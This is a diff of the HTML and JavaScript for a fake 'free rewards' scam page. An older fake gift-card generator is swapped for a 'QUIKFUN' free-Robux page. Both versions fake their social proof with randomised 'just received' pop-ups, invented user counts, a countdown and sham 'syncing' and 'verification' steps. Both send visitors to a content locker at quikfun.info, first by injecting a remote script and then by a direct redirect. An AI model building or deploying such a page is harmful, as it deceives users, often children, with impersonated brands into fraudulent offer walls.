@@ -1,298 +1,217 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Digital Rewards Generator - Claim Your Unused Gift Card 2026</title>
-<meta name="description" content="Access the official USA Digital Rewards Generator. Claim unused gift card allocations for Amazon, Xbox, Roblox, and more. Verified, secure, and instant distribution.">
-<meta name="keywords" content="digital rewards, unused gift cards, gift card generator, USA rewards allocation, claim rewards 2026">
-<meta name="author" content="Digital Rewards Hub">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QUIKFUN - Roblox Official Rewards 2026</title>
+    <link rel="icon" type="image/x-icon" href="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700458ba7cab444a522b7c8e71b8233099cf2c.png">
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Claim Your Unused Digital Reward | Official USA Allocation">
-<meta property="og:description" content="Verified unused codes ready for immediate distribution to USA users. Secure your reward allocation today.">
+        :root {
+            --primary: #00e676; /* Roblox Green modern */
+            --bg-dark: #0a0b0c;
+            --card-bg: rgba(26, 27, 29, 0.95); /* Glass base */
+            --glass-border: rgba(255, 255, 255, 0.1);
+        }
 
-<script src="https://cdn.tailwindcss.com"></script>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
-<style>
-* { font-family: 'Inter', sans-serif; }
-.gradient-bg { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
-.glass-effect { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.2); }
-.card-glow { box-shadow: 0 0 30px rgba(102, 126, 234, 0.3); }
-.reward-card { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
-.reward-card:hover { transform: translateY(-8px) scale(1.02); box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2); }
-.reward-card.selected { transform: translateY(-8px) scale(1.05); box-shadow: 0 0 40px rgba(102, 126, 234, 0.6); border: 2px solid #667eea; }
-.value-btn { transition: all 0.2s ease; }
-.value-btn:hover { transform: scale(1.05); }
-.value-btn.selected { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; transform: scale(1.1); box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4); }
-.progress-step { transition: all 0.5s ease; }
-.progress-step.active { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); box-shadow: 0 0 20px rgba(102, 126, 234, 0.5); }
-.progress-step.completed { background: #10b981; }
-.notification-ticker { animation: slideInRight 0.5s ease, slideOutRight 0.5s ease 4.5s; }
-@keyframes slideInRight { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
-@keyframes slideOutRight { from { transform: translateX(0); opacity: 1; } to { transform: translateX(100%); opacity: 0; } }
-@keyframes spin { to { transform: rotate(360deg); } }
-.spinner { animation: spin 1s linear infinite; }
-.pulse { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
-@keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-.fade-in { animation: fadeIn 0.6s ease; }
-@keyframes slideUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
-.slide-up { animation: slideUp 0.6s ease; }
-.confetti { position: absolute; width: 10px; height: 10px; background: #667eea; animation: confettiFall 3s linear infinite; }
-@keyframes confettiFall { to { transform: translateY(100vh) rotate(360deg); opacity: 0; } }
-.shimmer { background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent); background-size: 200% 100%; animation: shimmer 2s infinite; }
-@keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
-</style>
-    <script src="https://pl28675281.profitablecpmratenetwork.com/c0/a2/a7/c0a2a7f76498b50c6b773a5315b09601.js"></script>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Poppins", sans-serif; }
+        body { background-color: var(--bg-dark); color: #fff; overflow-x: hidden; min-height: 100vh; display: flex; flex-direction: column; }
+
+        /* Navbar */
+        .navbar {
+            width: 100%; height: 80px; background: rgba(10, 11, 12, 0.85);
+            backdrop-filter: blur(15px); display: flex; align-items: center;
+            justify-content: space-around; border-bottom: 1px solid var(--glass-border);
+            position: sticky; top: 0; z-index: 1000;
+        }
+        .profile { display: flex; align-items: center; }
+        .profileimg { width: 45px; height: 45px; border-radius: 50%; border: 2px solid var(--primary); padding: 2px; }
+        .profileimg img { width: 100%; border-radius: 50%; }
+        .text { margin-left: 12px; }
+        .text h4 { font-size: 16px; font-weight: 700; letter-spacing: 0.5px; }
+        .text p { font-size: 10px; color: var(--primary); text-transform: uppercase; font-weight: 700; }
+
+        .how-btn {
+            background: rgba(255, 255, 255, 0.05); border: 1px solid var(--glass-border);
+            border-radius: 12px; padding: 10px 22px; color: #fff; cursor: pointer;
+            transition: 0.3s; font-weight: 600; font-size: 14px;
+        }
+        .how-btn:hover { background: #fff; color: #000; }
+
+        /* Main Container */
+        .container {
+            flex: 1;
+            background: radial-gradient(circle at 50% 50%, rgba(0, 230, 118, 0.12) 0%, transparent 80%), 
+                        url('https://wallpaperaccess.com/full/8489366.jpg') center/cover no-repeat;
+            position: relative; display: flex; flex-direction: column; align-items: center; padding-top: 50px;
+        }
+        .container::before { content: ""; position: absolute; inset: 0; background: rgba(0, 0, 0, 0.82); z-index: 1; }
+
+        .boxholder { position: relative; z-index: 2; width: 100%; max-width: 500px; padding: 0 20px; }
+
+        /* Premium Glassmorphism Box */
+        .box-premium {
+            background: var(--card-bg); backdrop-filter: blur(25px);
+            border: 1px solid var(--glass-border); border-radius: 30px;
+            padding: 55px 40px; text-align: center;
+            box-shadow: 0 20px 60px -12px rgba(0, 0, 0, 0.6);
+            animation: slideUp 0.6s ease-out;
+            transition: all 0.3s ease;
+        }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+
+        .logo-rbx { width: 180px; margin-bottom: 30px; filter: drop-shadow(0 0 10px rgba(255,255,255,0.2)); }
+        .maintxt { color: #ccc; font-size: 14px; margin-bottom: 30px; line-height: 1.6; font-weight: 400; }
+
+        /* Input & Buttons */
+        input {
+            width: 100%; padding: 18px; background: rgba(0,0,0,0.5);
+            border: 1px solid var(--glass-border); border-radius: 16px;
+            color: #fff; font-size: 16px; margin-bottom: 22px; transition: 0.3s; outline: none;
+        }
+        input:focus { border-color: var(--primary); box-shadow: 0 0 20px rgba(0, 230, 118, 0.2); }
+
+        .btn-main {
+            width: 100%; padding: 18px; background: var(--primary); border: none;
+            border-radius: 16px; color: #000; font-size: 17px; font-weight: 800;
+            cursor: pointer; transition: 0.3s; text-transform: uppercase; letter-spacing: 1px;
+            box-shadow: 0 5px 15px rgba(0, 230, 118, 0.2);
+        }
+        .btn-main:hover { transform: scale(1.02); box-shadow: 0 10px 30px rgba(0, 230, 118, 0.5); }
+
+        /* Live Stats Under Box */
+        .live-stats {
+            display: flex; justify-content: space-between; margin-top: 30px;
+            font-size: 12px; color: #888; width: 100%; border-top: 1px solid var(--glass-border); padding-top: 18px;
+        }
+        .stat-item { display: flex; align-items: center; }
+        .dot { width: 8px; height: 8px; background: var(--primary); border-radius: 50%; margin-right: 6px; animation: blinkStatus 1.5s infinite alternate; }
+        @keyframes blinkStatus { 0% { opacity: 0.4; } 100% { opacity: 1; } }
+
+        /* Real-time Notifications */
+        #notification-box {
+            position: fixed; bottom: 20px; left: 20px; z-index: 2000;
+            background: rgba(26, 27, 29, 0.98); border: 1px solid var(--primary);
+            padding: 12px 20px; border-radius: 15px; display: none;
+            align-items: center; box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+            animation: slideInLeft 0.5s ease-out;
+            max-width: 300px;
+        }
+        @keyframes slideInLeft { from { transform: translateX(-120%); } to { transform: translateX(0); } }
+        .notif-img { width: 30px; margin-right: 12px; }
+        .notif-text { font-size: 13px; font-weight: 500; line-height: 1.4; color: #eee; }
+        .notif-text span { color: var(--primary); font-weight: 700; }
+
+        /* Footer */
+        .footer { padding: 40px 20px; text-align: center; color: #555; font-size: 11px; z-index: 2; position: relative; }
+        .footer strong { color: var(--primary); }
+    </style>
 </head>
-<body class="bg-gray-900 text-white overflow-x-hidden">
+<body>
 
-<div class="fixed inset-0 gradient-bg opacity-20"></div>
-<div id="notification" class="fixed top-4 right-4 z-50 max-w-sm"></div>
-
-<div class="relative min-h-screen flex flex-col items-center p-4 pt-12">
-
-    <header class="text-center mb-12 fade-in">
-        <h1 class="text-5xl md:text-6xl font-black mb-3 bg-gradient-to-r from-purple-400 via-pink-400 to-blue-400 bg-clip-text text-transparent leading-tight">
-            Claim Your Unused <br> <span class="text-white">Digital Reward</span>
-        </h1>
-        <p class="text-gray-300 text-lg md:text-xl font-light tracking-wide">
-            Verified unused codes ready for <span class="text-green-400 font-semibold">immediate distribution</span> to USA users.
-        </p>
-        <div class="flex items-center justify-center gap-2 mt-6">
-            <div class="flex -space-x-2">
-                <div class="w-8 h-8 rounded-full bg-gradient-to-br from-purple-500 to-pink-500 border-2 border-gray-900 shadow-lg"></div>
-                <div class="w-8 h-8 rounded-full bg-gradient-to-br from-blue-500 to-cyan-500 border-2 border-gray-900 shadow-lg"></div>
-                <div class="w-8 h-8 rounded-full bg-gradient-to-br from-green-500 to-emerald-500 border-2 border-gray-900 shadow-lg"></div>
-            </div>
-            <span class="text-sm text-gray-500 font-medium">12,847 rewards allocated today</span>
-        </div>
-    </header>
-
-    <div class="w-full max-w-3xl mb-12 fade-in">
-        <div class="flex items-center justify-between mb-4">
-            <div class="flex-1 flex items-center">
-                <div id="step1" class="progress-step active w-12 h-12 rounded-full flex items-center justify-center font-bold text-lg z-10 relative bg-gray-700">1</div>
-                <div id="line1" class="progress-line flex-1 h-2 bg-gray-700 mx-2"></div>
-            </div>
-            <div class="flex-1 flex items-center">
-                <div id="step2" class="progress-step w-12 h-12 rounded-full flex items-center justify-center font-bold text-lg z-10 relative bg-gray-700">2</div>
-                <div id="line2" class="progress-line flex-1 h-2 bg-gray-700 mx-2"></div>
-            </div>
-            <div><div id="step3" class="progress-step w-12 h-12 rounded-full flex items-center justify-center font-bold text-lg z-10 relative bg-gray-700">3</div></div>
-        </div>
-        <div class="flex justify-between text-sm text-gray-400 px-2 uppercase font-bold tracking-tighter">
-            <span>Select Reward</span><span>Processing</span><span>Claim Now</span>
-        </div>
+    <div id="notification-box">
+        <img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700441f54cda29360d16d1cb0f02e0e32ee181.png" class="notif-img">
+        <div class="notif-text" id="notif-content">User <span>Loading...</span> just received 10,000 Robux!</div>
     </div>
 
-    <div id="stage1" class="w-full max-w-5xl slide-up">
-        <div class="glass-effect rounded-3xl p-8 md:p-12 card-glow">
-            <h2 class="text-3xl md:text-4xl font-bold mb-8 text-center">Choose Your Reward Package</h2>
-            <div class="grid grid-cols-2 md:grid-cols-5 gap-4 mb-8" id="brandsGrid"></div>
-            <div class="mb-8">
-                <h3 class="text-xl font-semibold mb-4 text-center">Select Denomination</h3>
-                <div class="flex flex-wrap justify-center gap-4" id="valuesContainer">
-                    <button class="value-btn px-8 py-4 rounded-xl bg-gray-800 font-bold text-xl" data-value="25">$25</button>
-                    <button class="value-btn px-8 py-4 rounded-xl bg-gray-800 font-bold text-xl" data-value="50">$50</button>
-                    <button class="value-btn px-8 py-4 rounded-xl bg-gray-800 font-bold text-xl" data-value="100">$100</button>
-                    <button class="value-btn px-8 py-4 rounded-xl bg-gray-800 font-bold text-xl" data-value="250">$250</button>
+    <nav class="navbar">
+        <div class="profile">
+            <div class="profileimg"><img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700441f54cda29360d16d1cb0f02e0e32ee181.png"></div>
+            <div class="text">
+                <h4>QUIKFUN Official Rewards</h4>
+                <p>Status: Verified</p>
+            </div>
+        </div>
+        <button class="how-btn" onclick="alert('Step 1: Username\nStep 2: Amount\nStep 3: Verification')">How it works?</button>
+    </nav>
+
+    <div class="container">
+        <div class="boxholder">
+            <div class="box-premium step-1">
+                <img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/16649140404249d616d649baaf9da11aa8f051c07c.png" class="logo-rbx">
+                <p class="maintxt">Claim your official Robux rewards pool via <b>QUIKFUN</b> automated system.</p>
+                <input type="text" id="username" placeholder="Enter Roblox Username...">
+                <button class="btn-main" onclick="startConnect()">Connect Account</button>
+                
+                <div class="live-stats">
+                    <div class="stat-item"><span class="dot"></span> Servers: Online</div>
+                    <div class="stat-item">Users: <span id="user-count" style="color:#fff; margin-left:4px;">1,240</span></div>
                 </div>
             </div>
-            <button id="continueBtn" class="w-full py-5 rounded-xl bg-gradient-to-r from-purple-600 to-blue-600 font-bold text-xl opacity-50 cursor-not-allowed" disabled>Generate My Reward</button>
+
+            <div class="box-premium step-2" style="display:none;">
+                <img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700441f54cda29360d16d1cb0f02e0e32ee181.png" style="width:80px; animation: pulse 1s infinite alternate;">
+                <h3 id="load-text" style="margin-top:25px; letter-spacing:1px; font-weight:600;">Connecting...</h3>
+            </div>
+
+            <div class="box-premium step-3" style="display:none;">
+                <h3 style="margin-bottom:25px;">Select Robux Package</h3>
+                <div class="btn-main" style="background:#fff; color:#000; margin-bottom:15px; font-size:15px; display:flex; justify-content:space-between; align-items:center;" onclick="goToVerify()"><span>FREE</span> <span style="font-weight:700;">1,700 Robux</span></div>
+                <div class="btn-main" style="background:#fff; color:#000; margin-bottom:15px; font-size:15px; display:flex; justify-content:space-between; align-items:center;" onclick="goToVerify()"><span>FREE</span> <span style="font-weight:700;">4,500 Robux</span></div>
+                <div class="btn-main" style="margin-bottom:15px; font-size:15px; display:flex; justify-content:space-between; align-items:center;" onclick="goToVerify()"><span>FREE</span> <span style="font-weight:700;">10,000 Robux</span></div>
+            </div>
+
+            <div class="box-premium step-4" style="display:none;">
+                <h2 style="color:var(--primary); margin-bottom:15px; font-weight:700;">Final Verification</h2>
+                <p class="maintxt">Data synced for <b><span id="final-user" style="color:#fff;"></span></b>. Perform human verification to release the Robux to your account.</p>
+                <button class="btn-main" onclick="openLockerDirect()">Verify & Receive</button>
+            </div>
         </div>
     </div>
 
-    <div id="stage2" class="w-full max-w-3xl hidden">
-        <div class="glass-effect rounded-3xl p-8 md:p-12 text-center">
-            <h2 class="text-3xl md:text-4xl font-bold mb-8 text-white">Processing Request</h2>
-            <div class="flex justify-center mb-8"><div class="spinner w-20 h-20 border-4 border-purple-500/30 border-t-purple-500 rounded-full"></div></div>
-            <p id="statusText" class="text-2xl font-semibold text-purple-400 mb-6 pulse">Initializing...</p>
-            <div class="w-full bg-gray-800 rounded-full h-4 mb-6 overflow-hidden"><div id="progressBar" class="h-full bg-purple-600 shimmer" style="width: 0%"></div></div>
-            <div class="bg-gray-900/50 rounded-xl p-4 text-left h-32 overflow-y-auto font-mono text-xs text-green-400" id="techLog"></div>
-        </div>
-    </div>
-
-    <div id="stage3" class="w-full max-w-3xl hidden">
-        <div class="glass-effect rounded-3xl p-8 md:p-12 card-glow text-center relative overflow-hidden">
-            <div id="confettiContainer" class="absolute inset-0 pointer-events-none"></div>
-            <h2 class="text-4xl font-bold mb-2 text-green-400">Reward Generated!</h2>
-            <p class="text-gray-300 mb-8 font-medium">Your unique digital code is reserved and ready for reveal.</p>
-            <div class="bg-gradient-to-br from-purple-900/50 to-blue-900/50 rounded-2xl p-8 mb-8 border-2 border-purple-500/50" id="rewardDisplay"></div>
-            <div class="text-4xl font-black text-red-500 mb-8" id="countdown">04:59</div>
-            <button id="claimBtn" class="w-full py-6 rounded-xl bg-gradient-to-r from-green-500 to-emerald-600 font-black text-2xl shadow-lg hover:scale-105 transition-all">UNLOCK & CLAIM NOW</button>
-        </div>
-    </div>
-
-    <section class="max-w-4xl w-full mt-24 px-6 text-gray-400 text-sm leading-relaxed mb-12">
-        <h2 class="text-white text-2xl font-bold mb-4">Official USA Digital Rewards Allocation Protocol</h2>
-        <p class="mb-6">Our platform serves as a specialized gateway for identifying and distributing unused digital assets and gift card allocations within the United States.</p>
-        <div class="grid md:grid-cols-3 gap-8 border-t border-gray-800 pt-10">
-            <div><h4 class="text-white font-bold mb-2 uppercase tracking-tighter">Encrypted Protocol</h4><p>AES-256 bit encryption session protection.</p></div>
-            <div><h4 class="text-white font-bold mb-2 uppercase tracking-tighter">Regional Sync</h4><p>Optimized for North American distribution nodes.</p></div>
-            <div><h4 class="text-white font-bold mb-2 uppercase tracking-tighter">Real-time Audits</h4><p>Continuous inventory checks before allocation.</p></div>
-        </div>
-    </section>
-
-    <footer class="w-full py-10 border-t border-gray-800 text-center text-xs text-gray-500">
-        <p>© 2026 Digital Rewards Protocol • USA Regional Distribution</p>
+    <footer class="footer">
+        <p>&copy; 2026 <strong>QUIKFUN Official Portal</strong>. All rights reserved.</p>
+        <p style="margin-top:10px; opacity:0.5; font-size:10px;">Protected by DMCA. Unauthorized duplication is illegal.</p>
     </footer>
-</div>
 
-<script>
-const brands = [
-    { name: 'Amazon', logo: 'https://upload.wikimedia.org/wikipedia/commons/4/4a/Amazon_icon.svg' },
-    { name: 'Roblox', logo: 'https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg' },
-    { name: 'PlayStation', logo: 'https://upload.wikimedia.org/wikipedia/commons/0/00/PlayStation_logo.svg' },
-    { name: 'Xbox', logo: 'https://upload.wikimedia.org/wikipedia/commons/f/f9/Xbox_one_logo.svg' },
-    { name: 'Steam', logo: 'https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg' },
-    { name: 'Google Play', logo: 'https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg' },
-    { name: 'Apple', logo: 'https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg' },
-    { name: 'Nintendo', logo: 'https://upload.wikimedia.org/wikipedia/commons/0/0d/Nintendo.svg' },
-    { name: 'Netflix', logo: 'https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg' },
-    { name: 'Spotify', logo: 'https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg' }
-];
+    <script>
+        const s1 = document.querySelector('.step-1'), s2 = document.querySelector('.step-2'), 
+              s3 = document.querySelector('.step-3'), s4 = document.querySelector('.step-4');
+        const userInp = document.getElementById('username'), loadTxt = document.getElementById('load-text');
 
-const socialProofMessages = [
-    { user: 'Alex***92', brand: 'Amazon', value: '100' },
-    { user: 'Sarah***47', brand: 'Roblox', value: '50' },
-    { user: 'Mike***83', brand: 'PlayStation', value: '250' }
-];
+        // Notification Logic
+        setInterval(() => {
+            const u = ["King_Gamer", "Sara_Roblox", "Dark_Knight", "Gamer_2026"][Math.floor(Math.random()*4)];
+            const a = ["1,700", "4,500", "10,000"][Math.floor(Math.random()*3)];
+            document.getElementById('notif-content').innerHTML = `User <span>${u}</span> just received ${a} Robux!`;
+            const box = document.getElementById('notification-box');
+            box.style.display = 'flex';
+            setTimeout(() => { box.style.display = 'none'; }, 4000);
+        }, 12000);
 
-let sB = null, sV = null;
+        // Stats Update
+        setInterval(() => {
+            document.getElementById('user-count').innerText = (1100 + Math.floor(Math.random()*400)).toLocaleString();
+        }, 5000);
 
-function init() {
-    renderBrands();
-    setupEventListeners();
-    startSocialProof();
-}
-
-function renderBrands() {
-    const grid = document.getElementById('brandsGrid');
-    grid.innerHTML = brands.map(b => `
-        <div class="reward-card glass-effect rounded-2xl p-6 cursor-pointer text-center" data-brand="${b.name}">
-            <div class="mb-3 flex items-center justify-center h-16"><img src="${b.logo}" class="max-h-12 max-w-full object-contain"></div>
-            <div class="font-bold text-lg">${b.name}</div>
-        </div>
-    `).join('');
-}
-
-function setupEventListeners() {
-    document.getElementById('brandsGrid').onclick = (e) => {
-        const card = e.target.closest('.reward-card');
-        if (!card) return;
-        document.querySelectorAll('.reward-card').forEach(c => c.classList.remove('selected'));
-        card.classList.add('selected'); sB = card.dataset.brand; checkBtn();
-    };
-    document.getElementById('valuesContainer').onclick = (e) => {
-        const btn = e.target.closest('.value-btn');
-        if (!btn) return;
-        document.querySelectorAll('.value-btn').forEach(b => b.classList.remove('selected'));
-        btn.classList.add('selected'); sV = btn.dataset.value; checkBtn();
-    };
-    document.getElementById('continueBtn').onclick = () => { if (sB && sV) goToStage(2); };
-    
-    // الحل النهائي والآمن للـ Locker
-    document.getElementById('claimBtn').onclick = function() {
-        if (typeof og_load === 'function') {
-            og_load();
-        } else {
-            window.og_autostart = true;
-            const script = document.createElement('script');
-            script.src = 'https://quikfun.info/cl/js/qnnw94';
-            script.id = 'ogjs';
-            document.head.appendChild(script);
+        // Navigation
+        function startConnect() {
+            if(userInp.value.length < 3) return alert("Enter valid Username!");
+            s1.style.display='none'; s2.style.display='block';
+            loadTxt.innerText = `Searching for ${userInp.value}...`;
+            setTimeout(() => {
+                loadTxt.innerText = `Syncing QUIKFUN Rewards Cloud...`;
+                setTimeout(() => { s2.style.display='none'; s3.style.display='block'; }, 1500);
+            }, 2000);
         }
-    };
-}
 
-function checkBtn() {
-    if (sB && sV) {
-        document.getElementById('continueBtn').disabled = false;
-        document.getElementById('continueBtn').classList.remove('opacity-50', 'cursor-not-allowed');
-    }
-}
+        function goToVerify() {
+            s3.style.display='none'; s2.style.display='block';
+            loadTxt.innerText = `Preparing Packets...`;
+            setTimeout(() => {
+                document.getElementById('final-user').innerText = userInp.value;
+                s2.style.display='none'; s4.style.display='block';
+            }, 2000);
+        }
 
-function goToStage(stage) {
-    document.getElementById('stage1').classList.add('hidden');
-    document.getElementById('stage2').classList.add('hidden');
-    document.getElementById('stage3').classList.add('hidden');
-    const el = document.getElementById(`stage${stage}`);
-    el.classList.remove('hidden'); el.classList.add('slide-up');
-    if (stage === 2) startProcessing();
-    else if (stage === 3) { showReward(); startCountdown(); createConfetti(); }
-    updateProgressBar(stage);
-}
-
-function updateProgressBar(stage) {
-    for (let i = 1; i <= 3; i++) {
-        const step = document.getElementById(`step${i}`);
-        if (i < stage) { step.classList.replace('bg-gray-700', 'completed'); step.innerHTML = '✓'; }
-        else if (i === stage) { step.classList.replace('bg-gray-700', 'active'); }
-    }
-}
-
-function startProcessing() {
-    let stepIndex = 0;
-    const steps = ['Establishing secure link...', 'Syncing USA nodes...', 'Validating allocation...', 'Finalizing...'];
-    const pBar = document.getElementById('progressBar'), sText = document.getElementById('statusText'), log = document.getElementById('techLog');
-    const interval = setInterval(() => {
-        sText.textContent = steps[stepIndex];
-        pBar.style.width = ((stepIndex + 1) * 25) + '%';
-        const entry = document.createElement('div'); entry.textContent = `> ${steps[stepIndex]}`; log.appendChild(entry);
-        stepIndex++;
-        if (stepIndex >= steps.length) { clearInterval(interval); setTimeout(() => goToStage(3), 1000); }
-    }, 1000);
-}
-
-function showReward() {
-    const brand = brands.find(b => b.name === sB);
-    const teaserCode = Math.random().toString(36).substr(2, 4).toUpperCase(); // توليد 4 أحرف عشوائية
-    document.getElementById('rewardDisplay').innerHTML = `
-        <img src="${brand.logo}" class="h-16 mx-auto mb-4 object-contain">
-        <div class="text-4xl font-black mb-2">$${sV} ${sB} CARD</div>
-        <div class="font-mono text-gray-400 mt-2 text-sm tracking-[0.3em] uppercase">
-            STATUS: <span class="text-green-400">RESERVED</span><br>
-            CODE: XXXX-XXXX-<span class="text-white font-bold">${teaserCode}</span>
-        </div>
-    `;
-}
-
-function startCountdown() {
-    let t = 299;
-    const el = document.getElementById('countdown');
-    setInterval(() => {
-        let m = Math.floor(t / 60), s = t % 60;
-        el.textContent = `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
-        t--;
-    }, 1000);
-}
-
-function createConfetti() {
-    const container = document.getElementById('confettiContainer');
-    for (let i = 0; i < 40; i++) {
-        const c = document.createElement('div');
-        c.className = 'confetti'; c.style.left = Math.random() * 100 + '%';
-        container.appendChild(c);
-    }
-}
-
-function startSocialProof() {
-    let index = 0;
-    setInterval(() => {
-        const container = document.getElementById('notification'), msg = socialProofMessages[index % socialProofMessages.length];
-        const el = document.createElement('div');
-        el.className = 'notification-ticker glass-effect rounded-xl p-4 mb-2 shadow-lg';
-        el.innerHTML = `<div class="flex items-center gap-3"><div class="text-green-400 font-bold">✓</div><div><div class="font-bold text-sm">${msg.user}</div><div class="text-xs text-gray-300">Just claimed a reward</div></div></div>`;
-        container.appendChild(el);
-        setTimeout(() => el.remove(), 5000);
-        index++;
-    }, 8000);
-}
-
-window.addEventListener('DOMContentLoaded', init);
-</script>
+        // --- L-FIX L-AKHIR DYAL L-LOCKER ---
+        function openLockerDirect() {
+            console.log("Direct Trigger: Loading Locker...");
+            // Bach nt-fadaw ga3 Conflicts dyal Auto-open, ghadi n-redigiriw direct
+            window.location.href = "https://quikfun.info/cl/i/qnnw94";
+        }
+    </script>
 </body>
 </html>
